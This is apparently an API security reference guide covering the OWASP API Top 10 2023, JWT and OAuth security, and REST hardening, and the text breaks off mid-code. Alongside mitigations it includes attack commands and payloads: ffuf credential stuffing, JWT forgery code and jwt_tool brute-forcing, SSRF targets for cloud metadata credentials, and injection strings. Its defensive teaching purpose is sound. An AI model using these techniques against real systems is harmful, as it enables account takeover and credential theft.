# API Security Reference Library

> **Comprehensive cybersecurity reference for API security practitioners, pentesters, developers, and security engineers.**

---

## Table of Contents

1. [API Security Landscape](#1-api-security-landscape)
2. [OWASP API Security Top 10 2023](#2-owasp-api-security-top-10-2023)
3. [REST API Security](#3-rest-api-security)
4. [GraphQL Security](#4-graphql-security)
5. [gRPC Security](#5-grpc-security)
6. [API Gateway Security](#6-api-gateway-security)
7. [Akto API Security Platform](#7-akto-api-security-platform)
8. [API Penetration Testing](#8-api-penetration-testing)
9. [API Security in CI/CD](#9-api-security-in-cicd)
10. [API Security Standards and Monitoring](#10-api-security-standards-and-monitoring)

---

## 1. API Security Landscape

### The API Attack Surface Explosion

APIs have become the dominant interface for modern software. Gartner has projected that APIs will be the **#1 attack vector** for enterprise applications, surpassing traditional web application attacks. This prediction is borne out by breach data: Optus (2022), T-Mobile (2023), Twitter (2022), Peloton (2021), and hundreds of smaller organizations suffered major data exposures through API vulnerabilities — not through SQL injection or XSS on web frontends.

**Why APIs are the primary target:**

- **Volume:** The average enterprise now manages 613 APIs (Postman State of the API 2023), up from 362 in 2020. Large enterprises commonly exceed 10,000 internal and external API endpoints.
- **Speed:** APIs are deployed faster than web UI — developers push new endpoints with every sprint, often outpacing security review cycles.
- **Direct data access:** APIs return structured data (JSON, XML, Protobuf) that is immediately machine-parseable and exfiltrable at scale. A single vulnerable API endpoint can expose millions of records in minutes.
- **Implicit trust:** Internal microservice APIs often carry no authentication between services, assuming network-level trust that evaporates in a breach.
- **Incomplete visibility:** Security teams rarely have a complete inventory of APIs in production. Shadow APIs and zombie APIs (forgotten but live endpoints) create persistent blind spots.

### The API Sprawl Problem

**API sprawl** refers to the uncontrolled proliferation of APIs across an organization without adequate governance, documentation, or security oversight.

Root causes:
- Microservices architectures spawn hundreds of internal APIs per application
- Multiple API gateway products in use simultaneously (different teams, acquisitions)
- Multiple API versions (v1, v2, v3) all live in production
- Partner APIs, third-party integrations, and webhook receivers accumulate without tracking
- Mobile app backends, IoT device APIs, and internal tooling APIs managed separately

Consequences of sprawl:
- No complete API inventory means no complete attack surface awareness
- Outdated APIs with known vulnerabilities remain reachable
- Inconsistent authentication enforcement across API generations
- Data exposure through deprecated but functional endpoints
- Compliance gaps (GDPR, HIPAA, PCI DSS) when personal data flows through untracked APIs

**Quantifying the risk:** Akamai reports that 83% of internet traffic is now API traffic. Salt Security reports that 94% of organizations experienced API security problems in production in 2023.

### API Types and Security Implications

| API Type | Protocol | Data Format | Auth Pattern | Key Security Considerations |
|----------|----------|-------------|--------------|----------------------------|
| **REST** | HTTP/1.1, HTTP/2 | JSON, XML | Bearer token, API key, OAuth 2.0, mTLS | BOLA, mass assignment, CORS misconfiguration |
| **GraphQL** | HTTP/1.1 | JSON | Bearer token, API key | Introspection leakage, query depth attacks, batching abuse |
| **gRPC** | HTTP/2 | Protobuf (binary) | mTLS, token metadata | Reflection leakage, insecure channel, schema exposure |
| **SOAP** | HTTP, SMTP | XML | WS-Security, API key | XXE injection, WSDL enumeration, verbose SOAP faults |
| **WebSocket** | WS/WSS | Any (JSON common) | Cookie, token at handshake | Missing auth on upgrade, missing message validation, DoS |
| **Async/Event** | AMQP, Kafka, MQTT | JSON, Avro, Protobuf | SASL, mTLS, API key | Topic authorization, message injection, consumer group hijack |

### API Security vs. Web Application Security

Traditional web application security focuses on browser-rendered HTML and the human user interacting with a UI. API security differs in several fundamental ways:

| Dimension | Web App Security | API Security |
|-----------|-----------------|--------------|
| **Client** | Browser (human) | Machine (app, script, mobile) |
| **Attack scale** | One request per click | Thousands of requests per second |
| **Data exposure** | Partial (rendered HTML) | Complete (raw structured data) |
| **Auth state** | Cookie-based session | Stateless tokens (JWT, API key) |
| **Error handling** | User-facing HTML errors | Machine-parseable JSON errors |
| **Discovery** | Crawl HTML links | Fuzzing, spec analysis, traffic analysis |
| **Primary vulns** | XSS, CSRF, SQLi in forms | BOLA, mass assignment, broken auth |
| **WAF effectiveness** | High (HTML patterns known) | Lower (JSON payloads require API-aware WAF) |

### OWASP API Security Top 10 2023 Overview

The OWASP API Security Top 10 2023 replaced the 2019 edition with updated terminology reflecting evolved attack patterns. Key changes from 2019:

- **API3** renamed from "Excessive Data Exposure" and "Mass Assignment" (merged) to "Broken Object Property Level Authorization"
- **API6** is new: "Unrestricted Access to Sensitive Business Flows" — addressing bot-driven abuse
- **API10** is new: "Unsafe Consumption of APIs" — addressing supply chain risk via third-party APIs
- **API7** (SSRF) elevated from a note to a standalone category

The Top 10 addresses authorization failures (API1, API3, API5), authentication issues (API2), resource abuse (API4, API6), injection/misconfiguration (API7, API8), inventory failures (API9), and supply chain (API10).

### API Discovery Challenge

**Shadow APIs** are endpoints that exist in production but are unknown to the security team. They arise when:
- Developers deploy APIs without going through a formal API gateway or registration process
- Legacy systems expose APIs that were documented only in now-lost wikis
- Third-party SaaS integrations create API endpoints on the organization's subdomain
- Microservices expose health check endpoints (`/actuator`, `/metrics`, `/debug`) without security review

**Zombie APIs** are endpoints that have been intentionally deprecated but remain accessible in production. They are dangerous because:
- They often run older, unpatched code
- Security patches applied to the current version may not have been backported
- They may lack modern authentication (e.g., no JWT validation, accepts legacy API keys)
- They are not monitored by alerting systems watching the "current" API

**Deprecated endpoint risks:** A 2022 Salt Security study found that 44% of organizations have zombie APIs in production, and these are 3x more likely to contain critical vulnerabilities than current API versions.

### API Testing Tools

**Postman** (https://postman.com):
- Industry-standard API testing and documentation platform
- Collections: group related API requests for systematic testing
- Environments: manage auth tokens, base URLs, test variables
- Collection Runner: automated sequential execution of API test suites
- Monitor: scheduled automated API tests
- Security relevance: manual auth testing, response inspection, collection sharing for team pentests

**Insomnia** (https://insomnia.rest):
- Open-source REST/GraphQL/gRPC client
- Plugin ecosystem including security-focused plugins
- Environment templating for multi-environment testing
- Inline variable extraction from responses for chained requests

### OpenAPI Specification as Security Documentation

The OpenAPI Specification (OAS, formerly Swagger) at version 3.x provides machine-readable API contracts that serve dual purposes: developer documentation and security baseline.

Security-relevant OAS elements:
```yaml
components:
  securitySchemes:
    BearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT
    ApiKeyAuth:
      type: apiKey
      in: header
      name: X-API-Key
    OAuth2:
      type: oauth2
      flows:
        authorizationCode:
          authorizationUrl: https://auth.example.com/oauth/authorize
          tokenUrl: https://auth.example.com/oauth/token
          scopes:
            read:users: Read user data
            write:users: Modify user data
security:
  - BearerAuth: []
paths:
  /users/{id}:
    get:
      security:
        - BearerAuth: []
      parameters:
        - name: id
          in: path
          required: true
          schema:
            type: integer
            minimum: 1
```

OAS documents enable:
- Automated security linting (Spectral, 42Crunch)
- Auto-generated API security test cases
- Contract validation in CI/CD
- Attack surface mapping for pentesters

---

## 2. OWASP API Security Top 10 2023

### API1:2023 — Broken Object Level Authorization (BOLA)

**Description:**
BOLA (formerly called IDOR — Insecure Direct Object Reference in the OWASP Web Top 10) is the most prevalent and impactful API vulnerability. It occurs when an API endpoint accepts a user-supplied object identifier (ID) and returns the corresponding object without verifying that the requesting user is authorized to access that specific object. The API validates *authentication* (the user is logged in) but not *authorization* (the user is allowed to see *this* object).

**Why it dominates API vulnerabilities:**
APIs return raw data objects — unlike web UIs that render only the data the server decides to show, APIs return the complete object. Developers often assume that clients "can only see their own data" without enforcing this at the API layer.

**Attack Example:**
```
# Victim user has account ID 1042
GET /api/v1/accounts/1042/statements HTTP/1.1
Authorization: Bearer <victim_token>
→ 200 OK { "balance": 12500, "transactions": [...] }

# Attacker authenticates as user ID 9999, then accesses victim's account:
GET /api/v1/accounts/1042/statements HTTP/1.1
Authorization: Bearer <attacker_token>
→ 200 OK { "balance": 12500, "transactions": [...] }  ← BOLA!
```

Sequential ID enumeration: If IDs are integers, attacker iterates 1, 2, 3... to harvest all user data.
UUID enumeration: If IDs are UUIDs, attacker harvests IDs from other API responses (e.g., public profile endpoints) then uses them to access private endpoints.

**Horizontal vs. Vertical Privilege Escalation:**
- *Horizontal*: User A accesses User B's data (same privilege level)
- *Vertical*: Regular user accesses admin-level objects (different privilege level)

BOLA typically enables horizontal privilege escalation; Broken Function Level Authorization (API5) enables vertical.

**Detection:**
- Intercept authenticated requests and swap object IDs
- Look for integer IDs in URL paths, query parameters, and request bodies
- Test whether IDs from one user account are accessible with another user's token
- Automate with Burp Intruder or custom scripts iterating ID ranges
- Check nested resources: `/api/orders/{orderId}/items/{itemId}` — test each level

**Mitigation:**
```python
# BAD: No authorization check
def get_account(account_id, current_user):
    return db.query(Account).filter_by(id=account_id).first()

# GOOD: Enforce object-level authorization
def get_account(account_id, current_user):
    account = db.query(Account).filter_by(
        id=account_id,
        owner_id=current_user.id  # Always scope to authenticated user
    ).first()
    if not account:
        raise HTTPException(403, "Access denied")
    return account
```

Use indirect references: map internal IDs to user-specific tokens. Implement centralized authorization middleware rather than per-endpoint checks.

---

### API2:2023 — Broken Authentication

**Description:**
Authentication mechanisms for APIs are frequently implemented incorrectly or incompletely. Unlike web applications that can rely on battle-tested session management frameworks, APIs often implement custom authentication logic — JWT validation, API key checking, token introspection — that contains subtle flaws.

**Common Authentication Weaknesses:**

1. **Weak token secrets:** JWT signed with `HS256` using `secret`, `password`, `123456`
2. **Missing token expiry:** JWTs issued without `exp` claim, valid forever
3. **No token revocation:** No mechanism to invalidate compromised tokens
4. **Credential stuffing exposure:** Login endpoint without rate limiting or lockout
5. **Insecure token transmission:** Tokens passed in URL query parameters (logged in access logs)
6. **Missing authentication on some endpoints:** `/api/v1/users` requires auth, `/api/v2/users` does not
7. **Weak password reset flows:** API reset tokens are short, predictable, or not single-use

**Attack Examples:**

*Credential stuffing:*
```bash
# Using ffuf to credential stuff a login API
ffuf -w credentials.txt -X POST -u https://api.target.com/v1/login   -H "Content-Type: application/json"   -d '{"email":"FUZZ_USER","password":"FUZZ_PASS"}'   -fc 401 -t 10
```

*JWT none algorithm attack:*
```python
# Attacker modifies JWT header to alg: none, strips signature
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).decode().rstrip('=')
forged_token = f"{header}.{payload}."
```

**Detection:**
- Test login endpoints for rate limiting (send 100+ requests per minute)
- Decode JWTs at jwt.io, check `exp`, `alg`, signature algorithm
- Test token after logout — is it still accepted?
- Fuzz password reset tokens for length and randomness
- Check if tokens appear in server access logs (URL parameter transmission)

**Mitigation:**
- Enforce `exp` claim on all JWTs; max lifetime 15 minutes for access tokens
- Use refresh token rotation with single-use refresh tokens
- Implement rate limiting on all authentication endpoints (5 attempts/minute per IP)
- Use strong secrets (256-bit random) for HMAC-based JWT signing
- Prefer RS256 (asymmetric) over HS256 (shared secret) for JWT validation at multiple services
- Implement token blacklist/blocklist for logout and compromise scenarios
- Use PKCE for all OAuth 2.0 authorization code flows

---

### API3:2023 — Broken Object Property Level Authorization

**Description:**
This category merges two 2019 categories: "Excessive Data Exposure" and "Mass Assignment." Both involve failing to properly control which object properties a user can read or write.

**Excessive Data Exposure (read side):**
The API returns complete object representations including sensitive fields that the client doesn't need. Developers rely on the frontend to "hide" sensitive fields rather than filtering them at the API layer.

```json
// API returns full user object including sensitive fields
GET /api/v1/users/profile
{
  "id": 1042,
  "email": "user@example.com",
  "name": "Alice",
  "password_hash": "$2b$12$abc...",  ← should never be exposed
  "ssn": "123-45-6789",              ← PII, not needed by client
  "internal_notes": "VIP customer",  ← internal field
  "stripe_customer_id": "cus_xyz",   ← third-party ID
  "admin": false                     ← writable admin flag!
}
```

**Mass Assignment (write side):**
The API automatically binds request body fields to database model fields without an allowlist. An attacker can supply extra fields to modify properties they shouldn't control.

```bash
# Normal registration
POST /api/v1/users/register
{"email": "attacker@evil.com", "password": "pass123"}

# Mass assignment attack — add admin:true to request body
POST /api/v1/users/register
{"email": "attacker@evil.com", "password": "pass123", "admin": true, "balance": 99999}
```

**Detection:**
- Review API responses for sensitive fields (passwords, internal IDs, PII beyond what's needed)
- Compare response fields to what the UI actually displays
- Add extra fields to PUT/PATCH/POST requests and check if they're accepted
- Test `role`, `admin`, `is_admin`, `permissions`, `balance`, `credit` fields in registration/update payloads
- Use Param Miner (Burp extension) to discover hidden writable parameters

**Mitigation:**
```python
# BAD: Return entire database model
@app.route('/api/user/profile')
def get_profile():
    user = User.query.get(current_user.id)
    return jsonify(user.to_dict())  # Exposes all fields

# GOOD: Explicit allowlist for response fields
@app.route('/api/user/profile')
def get_profile():
    user = User.query.get(current_user.id)
    return jsonify({
        'id': user.id,
        'email': user.email,
        'name': user.name,
        'created_at': user.created_at.isoformat()
    })

# BAD: Bind all request fields to model
@app.route('/api/user/update', methods=['PUT'])
def update_user():
    user = User.query.get(current_user.id)
    for key, value in request.json.items():
        setattr(user, key, value)  # Mass assignment vulnerability

# GOOD: Explicit allowlist for writable fields
ALLOWED_UPDATE_FIELDS = {'name', 'bio', 'avatar_url'}
@app.route('/api/user/update', methods=['PUT'])
def update_user():
    user = User.query.get(current_user.id)
    for key, value in request.json.items():
        if key in ALLOWED_UPDATE_FIELDS:
            setattr(user, key, value)
```

Use Pydantic (Python), Joi (Node.js), or Jackson `@JsonIgnoreProperties` (Java) to enforce input/output schemas at the API layer.

---

### API4:2023 — Unrestricted Resource Consumption

**Description:**
APIs that do not limit the volume or frequency of requests allow attackers to exhaust server resources (CPU, memory, bandwidth, database connections, third-party API quotas) through automated abuse. This category covers traditional rate limiting failures as well as resource-intensive operations that can be triggered without cost to the attacker.

**Attack Vectors:**

- **Request flooding:** Send thousands of requests per second to overwhelm server
- **Large payload attacks:** Submit multi-megabyte JSON payloads that consume parser memory
- **Expensive query attacks:** GraphQL queries requesting deeply nested objects; search endpoints with wildcard queries
- **Bulk operation abuse:** `/api/v1/emails/send` called 10,000 times to abuse sending quota and incur cost
- **File upload abuse:** Upload thousands of large files to exhaust storage
- **Third-party cost exploitation:** Trigger API calls to paid services (SMS, email, payment) repeatedly

**Example — SMS verification abuse:**
```
POST /api/v1/auth/send-sms-otp
{"phone": "+15551234567"}

# Attacker sends 10,000 requests → $500 in SMS charges + DoS of legitimate users
```

**Rate Limiting Algorithms:**

*Token Bucket:* Bucket holds N tokens, refills at R tokens/second. Each request consumes 1 token. Allows bursts up to bucket size.

*Leaky Bucket:* Requests enter a queue that drains at a fixed rate. Excess requests are dropped. Smooths traffic, no burst allowance.

*Fixed Window:* Count requests in fixed time window (e.g., 100/minute). Vulnerable to burst at window boundary (2x rate at window edge).

*Sliding Window Log:* Track timestamp of each request. Count requests in last N seconds. Most accurate, highest memory.

**Detection:**
- Test without rate limiting — can you send 1000 requests/minute without throttling?
- Send oversized request bodies — does the server accept 100MB JSON?
- Trigger expensive operations (password reset emails, SMS) repeatedly
- Monitor response times under load — does latency increase indicating resource exhaustion?

**Mitigation:**
```nginx
# Nginx rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $http_authorization zone=api_user:10m rate=60r/m;

location /api/ {
    limit_req zone=api burst=20 nodelay;
    limit_req zone=api_user burst=10;
    client_max_body_size 1m;  # Enforce payload size limit
}
```

Implement tiered rate limits: per-IP, per-user, per-API-key, per-endpoint. Apply stricter limits to expensive operations. Return `429 Too Many Requests` with `Retry-After` header.

---

### API5:2023 — Broken Function Level Authorization (BFLA)

**Description:**
While BOLA (API1) is about accessing *other users' data objects*, BFLA is about accessing *administrative or privileged functions* that a lower-privileged user should not be able to invoke. APIs often expose admin endpoints alongside regular user endpoints, with authorization checked inconsistently.

**Attack Patterns:**

1. **HTTP method switching:** API allows `GET /api/users/{id}` for users, `DELETE /api/users/{id}` only for admins — but the DELETE authorization check is missing.

2. **Admin endpoint discovery:**
```
/api/v1/users/1042         ← user endpoint (authorized)
/api/v1/admin/users/1042   ← admin endpoint (should be restricted)
/api/v1/users/1042/admin   ← alternative admin path
```

3. **Privilege escalation via role parameter:**
```
PUT /api/v1/users/profile
{"name": "Alice", "role": "admin"}  ← role field accepted without auth check
```

**Detection:**
- Map all API endpoints from OpenAPI spec, JS source, mobile app APK analysis
- Identify admin vs. user endpoint patterns (`/admin/`, `/manage/`, `/internal/`)
- Test each HTTP method on each endpoint with a regular user token
- Look for endpoints that return 403 for GET but 200 for POST/DELETE/PUT
- Use kiterunner to brute-force API routes: `kr scan https://target.com -w routes-large.kite`

**Mitigation:**
- Implement a centralized authorization framework (not per-endpoint checks)
- Default-deny: all endpoints require explicit permission grants
- Separate admin API surfaces (different subdomain, separate auth system)
- Use RBAC or ABAC enforced at the gateway or middleware layer
- Audit HTTP method permissions separately — GET and DELETE have different risk profiles

---

### API6:2023 — Unrestricted Access to Sensitive Business Flows

**Description:**
New in 2023, this category addresses automated abuse of legitimate business flows. The API endpoints themselves are working as designed, but attackers use automation to exploit business logic at scale. This is distinguished from API4 (resource exhaustion) by targeting business outcomes rather than server resources.

**Examples:**

- **Scalper bots:** Automated purchase of limited-availability items (sneakers, concert tickets, PS5s) faster than human users
- **Account takeover flows:** Automated credential stuffing → password reset → account capture
- **Referral/bonus abuse:** Automated creation of fake accounts to claim referral bonuses
- **Voting/rating manipulation:** Automated upvotes, fake reviews, poll manipulation
- **Inventory hoarding:** Add-to-cart automation that locks inventory without purchasing
- **Free tier abuse:** Automated creation of free accounts to exceed free tier limits

**Detection:**
- Analyze traffic patterns for non-human behavior (uniform timing, missing browser fingerprints)
- Monitor business KPIs for anomalies (unusual purchase velocity, signup spikes from single IP ranges)
- Track device fingerprints, browser characteristics, mouse movement patterns
- Alert on: >N account creations from same IP, >N password resets for same account in 1 hour

**Mitigation:**
- CAPTCHA on sensitive flows (account creation, checkout, password reset)
- Device fingerprinting (browser fingerprint, TLS JA3 fingerprint)
- Behavioral analytics (request timing, user journey analysis)
- Business-logic rate limits: max 3 items per checkout per user per hour
- Email/phone verification before activating high-value flows
- Purchase velocity limits; geographic restrictions for abnormal patterns

---

### API7:2023 — Server Side Request Forgery (SSRF)

**Description:**
SSRF occurs when an API accepts a URL or hostname as input and makes a server-side HTTP request to that URL without validating the destination. An attacker can cause the API server to make requests to internal services, cloud metadata endpoints, or other restricted resources.

**High-Value SSRF Targets:**

```
# AWS EC2 metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal services
http://localhost:8080/admin
http://internal-api.company.internal/secrets
http://192.168.1.1/  (router admin panel)

# Kubernetes API
http://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

**Common API Parameters Vulnerable to SSRF:**
```
?url=https://attacker.com/
?webhook=https://attacker.com/
?callback=https://attacker.com/
?redirect=https://attacker.com/
?imageUrl=https://attacker.com/image.jpg
?fetchUrl=https://attacker.com/
?import=https://attacker.com/data.json
```

**Detection:**
- Identify API parameters that accept URLs, hostnames, or IP addresses
- Use Burp Collaborator or interactsh to detect blind SSRF (DNS callbacks)
- Test with `http://127.0.0.1/`, `http://localhost/`, cloud metadata IPs
- Try URL scheme variations: `file://`, `dict://`, `gopher://`, `ftp://`
- Test URL redirectors that might bypass IP allowlists

**Mitigation:**
- Validate URL schemes (allow only `https://`)
- Enforce allowlist of permitted external domains
- Block private IP ranges (RFC 1918) and metadata IPs at the network layer
- Use a dedicated HTTP client service in a DMZ for external fetches
- Disable unnecessary URL-fetching features entirely

---

### API8:2023 — Security Misconfiguration

**Description:**
APIs are misconfigured at multiple layers: HTTP security headers, CORS policies, HTTP methods, TLS configuration, error messages, and cloud storage backing the API.

**Common Misconfigurations:**

*CORS misconfiguration:*
```
# Overly permissive CORS — reflects Origin header
Access-Control-Allow-Origin: https://attacker.com  ← should never happen
Access-Control-Allow-Credentials: true             ← allows cookie theft cross-origin
```

*Verbose error messages:*
```json
{
  "error": "relation "users" does not exist",
  "detail": "at character 45",
  "query": "SELECT * FROM users WHERE id = 'test' AND password = 'test'"
}
```

*Unnecessary HTTP methods:*
```
# OPTIONS response reveals all allowed methods
Allow: GET, POST, PUT, DELETE, TRACE, TRACK
# TRACE enables cross-site tracing (XST) attacks
```

*Default/sample endpoints exposed:*
- `/api/swagger-ui.html` — Swagger UI in production leaks full API spec
- `/actuator/env` — Spring Boot actuator exposes environment variables
- `/api/graphql/playground` — GraphQL playground enabled in production

**Detection:**
- Run `nuclei -t misconfiguration/ -u https://api.target.com`
- Test CORS with `Origin: https://evil.com` header
- Request OPTIONS on all endpoints; audit allowed methods
- Check for debug endpoints: `/debug`, `/test`, `/admin`, `/internal`
- Scan TLS configuration with `testssl.sh` or `sslyze`

**Mitigation:**
```python
# Flask-CORS proper configuration
from flask_cors import CORS
CORS(app, origins=['https://app.example.com'],
     methods=['GET', 'POST'],
     allow_headers=['Content-Type', 'Authorization'])

# Never use: CORS(app, origins='*', supports_credentials=True)
```

- Disable TRACE, TRACK HTTP methods
- Return generic error messages; log details server-side only
- Disable Swagger UI, GraphQL playground, and debug endpoints in production
- Apply security headers: `Content-Type: application/json`, `X-Content-Type-Options: nosniff`

---

### API9:2023 — Improper Inventory Management

**Description:**
Organizations fail to maintain an accurate, up-to-date inventory of their API endpoints. This allows shadow APIs (unknown to security) and zombie APIs (deprecated but active) to persist in production without security controls.

**Shadow API Discovery Techniques (attacker perspective):**
- JavaScript source analysis — mobile/web apps reference API endpoints in JS bundles
- APK decompilation — Android apps contain hardcoded API endpoints
- Google dorking: `site:target.com inurl:/api/`
- Shodan/Censys for IP ranges associated with the target
- Git repository analysis for hardcoded endpoints
- DNS enumeration: `api.`, `api-v2.`, `api-internal.`, `api-staging.`

**Zombie API Indicators:**
- API versions deprecated in documentation but still responding to requests
- Endpoints that return 200 for requests to `v1/` when `v3/` is current
- Endpoints with `debug`, `test`, `old`, `legacy` in path
- Services running on non-standard ports discovered through network scanning

**Detection:**
- Continuously crawl/monitor all subdomains for API endpoints
- Track API versions deployed in each environment
- Compare API gateway routing table to actual deployed endpoints
- Monitor for endpoints that receive traffic but aren't in the API catalog

**Mitigation:**
- Implement an API catalog/registry (e.g., Backstage, Akto, Kong Dev Portal)
- Enforce API gateway as the single entry point (block direct service access)
- Sunset policy: hard-delete zombie API versions after deprecation window
- Automated discovery: deploy traffic analysis tools to detect unregistered APIs

---

### API10:2023 — Unsafe Consumption of APIs

**Description:**
New in 2023, this category addresses the supply chain risk of APIs consuming data from third-party or partner APIs. When an application trusts data from external APIs without validation, attackers who compromise those external APIs can inject malicious data into the consuming application.

**Attack Scenario:**
```
1. Application uses third-party geocoding API to convert addresses to coordinates
2. Attacker compromises geocoding API (or performs BGP hijack/DNS poisoning)
3. Geocoding API returns malicious data: {"city": "'; DROP TABLE users; --"}
4. Application trusts geocoding API response, uses value directly in SQL query
5. SQL injection via third-party API data
```

**Common Third-Party API Trust Issues:**
- OAuth providers returning user data that's injected into queries without sanitization
- Payment gateway webhooks trusted without signature verification
- Shipping API responses containing HTML stored and rendered without escaping
- AI/ML API outputs used in code execution or file operations

**Detection:**
- Inventory all third-party API integrations
- Test third-party API data handling: can you inject payloads via data the app fetches?
- Review webhook handlers for signature verification
- Check if third-party API failures cause cascading failures

**Mitigation:**
- Validate and sanitize ALL external API responses as untrusted input
- Verify webhook signatures (HMAC-SHA256) before processing
- Implement circuit breakers for third-party API failures
- Define and enforce schemas for accepted third-party API responses
- Use separate service accounts with minimal permissions for third-party API calls

---

## 3. REST API Security

### Authentication Patterns

#### API Key Authentication
```http
# Header transmission (recommended)
GET /api/v1/data HTTP/1.1
X-API-Key: sk-live-abc123def456

# NEVER in URL (logged in access logs, browser history, Referer header)
GET /api/v1/data?api_key=sk-live-abc123def456  ← INSECURE
```

API key security practices:
- Generate cryptographically random keys (256-bit minimum)
- Use environment-specific key prefixes (`sk-live-`, `sk-test-`) to identify leaked keys
- Scope keys to minimum necessary permissions
- Implement automatic rotation; detect leaked keys via GitHub secret scanning integration
- Hash keys before storing (bcrypt or Argon2); never store plaintext
- Rate limit per API key independently

#### Bearer Token (JWT) Authentication
```http
GET /api/v1/profile HTTP/1.1
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

### JWT Security Deep Dive

JSON Web Tokens are ubiquitous in API authentication and are a rich source of vulnerabilities.

**JWT Structure:**
```
header.payload.signature
eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMDQyIiwiZXhwIjoxNzA5MDAwMDAwfQ.signature
```

**Algorithm Confusion Attacks:**

*None Algorithm (CVE-class):*
```python
# Vulnerable server accepts alg:none
import jwt
# Attacker crafts token with no signature
malicious_payload = {"sub": "admin", "role": "superuser"}
malicious_token = jwt.encode(malicious_payload, "", algorithm="none")
```

*RS256 → HS256 Confusion:*
If a server uses RS256 (asymmetric), the public key is often obtainable. If the server can be tricked into accepting HS256, the attacker signs the token with the public key as the HMAC secret.

```python
# Attack: forge token signed with public key as HMAC secret
import jwt
with open('public_key.pem', 'r') as f:
    public_key = f.read()
# Server validates HS256 using public key as secret — attacker knows public key!
forged = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")
```

*jwk Header Injection:*
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "attacker_controlled_public_key",
    "e": "AQAB"
  }
}
```
Attacker embeds their own JWK in the token header; vulnerable servers use this embedded key to verify.

*kid (Key ID) Injection:*
```json
{"alg": "HS256", "kid": "../../dev/null"}
// Server fetches key from filesystem path; /dev/null = empty string = trivial forgery
{"alg": "HS256", "kid": "'; DROP TABLE keys; --"}
// SQL injection via kid parameter
```

**JWT Validation Checklist:**
```python
import jwt
from jwt.exceptions import InvalidTokenError

def validate_jwt(token: str, expected_audience: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            PUBLIC_KEY,
            algorithms=["RS256"],  # Explicit allowlist — never accept "none"
            audience=expected_audience,
            options={
                "require": ["exp", "iat", "sub", "aud"],  # Required claims
                "verify_exp": True,
                "verify_iat": True,
                "verify_aud": True,
            }
        )
        # Additional custom validation
        if payload.get("iss") != EXPECTED_ISSUER:
            raise ValueError("Invalid issuer")
        return payload
    except InvalidTokenError as e:
        raise HTTPException(401, f"Invalid token: {e}")
```

**JWT Attack Tool — jwt_tool:**
```bash
# Install
git clone https://github.com/ticarpi/jwt_tool

# Test none algorithm
python3 jwt_tool.py <token> -X a

# Test algorithm confusion (RS256→HS256) with public key
python3 jwt_tool.py <token> -X k -pk public_key.pem

# Brute force weak HMAC secret
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Fuzz JWT claims
python3 jwt_tool.py <token> -T -S hs256 -p secret
```

### OAuth 2.0 Flows for APIs

**Client Credentials Flow** (machine-to-machine, no user context):
```http
POST /oauth/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=service-a-client-id
&client_secret=service-a-secret
&scope=read:data write:data

→ {"access_token": "...", "token_type": "bearer", "expires_in": 3600}
```

**Authorization Code + PKCE Flow** (user-delegated access):
```python
import secrets, hashlib, base64

# Step 1: Generate PKCE challenge
code_verifier = secrets.token_urlsafe(64)  # 64 random bytes
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).decode().rstrip('=')

# Step 2: Redirect user to authorization endpoint
auth_url = (
    f"https://auth.example.com/oauth/authorize"
    f"?response_type=code"
    f"&client_id={CLIENT_ID}"
    f"&redirect_uri=https://app.example.com/callback"
    f"&code_challenge={code_challenge}"
    f"&code_challenge_method=S256"
    f"&state={secrets.token_urlsafe(16)}"  # CSRF protection
    f"&scope=openid profile email"
)

# Step 3: Exchange code for token (with verifier, not secret)
token_response = requests.post("https://auth.example.com/oauth/token", data={
    "grant_type": "authorization_code",
    "code": authorization_code,
    "redirect_uri": "https://app.example.com/callback",
    "client_id": CLIENT_ID,
    "code_verifier": code_verifier,  # Proves we generated the challenge
})
```

**OAuth 2.0 Attack Surface:**
- **Open redirect in redirect_uri:** `redirect_uri=https://attacker.com/` steals auth code
- **State parameter CSRF:** Missing/unpredictable state enables CSRF on OAuth flow
- **Token leakage via Referer:** Authorization code in URL leaks in Referer header
- **Token substitution:** Reuse access token from one client at another client's API

### HTTPS Enforcement

APIs must enforce TLS exclusively:
```nginx
# Redirect all HTTP to HTTPS
server {
    listen 80;
    return 301 https://$host$request_uri;
}

# HSTS to prevent protocol downgrade
server {
    listen 443 ssl;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
}
```

### Input Validation

```python
from pydantic import BaseModel, validator, Field
from typing import Optional
import re

class CreateUserRequest(BaseModel):
    email: str = Field(..., max_length=254)
    username: str = Field(..., min_length=3, max_length=30, pattern=r'^[a-zA-Z0-9_-]+$')
    age: int = Field(..., ge=13, le=120)
    bio: Optional[str] = Field(None, max_length=500)

    @validator('email')
    def validate_email(cls, v):
        # Use a proper email validation library, not regex
        import email_validator
        email_validator.validate_email(v)
        return v.lower()
```

Schema validation prevents:
- SQL injection (parameterized queries + type enforcement)
- Path traversal (regex on filename parameters)
- Buffer overflow attempts (length limits)
- Type confusion attacks (strict type enforcement)

### HTTP Security Headers for REST APIs

```python
# FastAPI security headers middleware
from fastapi import FastAPI
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Cache-Control"] = "no-store"
